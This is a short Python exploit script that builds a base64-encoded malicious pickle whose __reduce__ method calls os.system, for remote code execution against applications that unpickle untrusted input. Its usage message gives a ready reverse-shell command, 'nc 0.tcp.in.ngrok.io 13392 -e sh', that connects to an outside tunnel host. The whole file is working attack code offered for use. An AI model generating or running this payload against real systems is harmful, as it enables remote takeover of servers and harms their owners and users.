import pickle
import sys
import base64
import os

#pickle deserialization exploit
#pickle RCE
#python pickle Remote code execution 


if len(sys.argv) != 2:
    print("Usage: \n\tpython pickle_exploit.py 'nc 0.tcp.in.ngrok.io 13392 -e sh'")
    exit()
command = sys.argv[1]

class Pickle_Rce(object):
    def __reduce__(self):  
        return (os.system,(command,))
print(base64.b64encode(pickle.dumps(Pickle_Rce())).decode())

